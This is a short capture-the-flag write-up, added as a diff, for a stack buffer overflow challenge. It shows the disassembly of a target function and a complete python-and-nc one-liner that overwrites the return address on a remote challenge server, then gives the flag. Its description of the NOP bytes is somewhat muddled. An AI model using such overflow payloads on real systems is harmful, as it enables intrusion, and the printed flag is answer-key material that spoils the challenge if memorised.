@@ -1,0 +1,29 @@
+Oh how I love binary exploitation :3
+
+Since the name is 32 chars and the fgets takes in 256 chars, we can exploit the overflowing. Also it's the name of the problem.
+
+Basically, we're going to smash the stack and have the pointer jump to the show_soln function. Since we're given the executable, we can run `objdump -d main` to get the address of the function.
+
+08048732 <show_soln>:
+ 8048732:	55                   	push   %ebp
+ 8048733:	89 e5                	mov    %esp,%ebp
+ 8048735:	83 ec 08             	sub    $0x8,%esp
+ 8048738:	83 ec 0c             	sub    $0xc,%esp
+ 804873b:	68 13 89 04 08       	push   $0x8048913
+ 8048740:	e8 86 ff ff ff       	call   80486cb <printfile>
+ 8048745:	83 c4 10             	add    $0x10,%esp
+ 8048748:	a1 a4 9c 04 08       	mov    0x8049ca4,%eax
+ 804874d:	83 ec 0c             	sub    $0xc,%esp
+ 8048750:	50                   	push   %eax
+ 8048751:	e8 8a fd ff ff       	call   80484e0 <fflush@plt>
+ 8048756:	83 c4 10             	add    $0x10,%esp
+ 8048759:	c9                   	leave  
+ 804875a:	c3                   	ret    
+
+In code, we want to have the pointer jump to \x32\x87\x04\x08. But first we have to fill up the buffer with dummy chars. After a bit of tinkering with where the program segfaults, I can then insert a nop-sled (\x90), which makes the program move on the to next instruction, and in our case, the next instruction is the show_soln function.
+
+The complete terminal command:
+python -c "print 'A'*32 + '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x32\x87\x04\x08'" | nc 104.236.255.49 12342
+
+The flag is:
+_r3dir3ction_
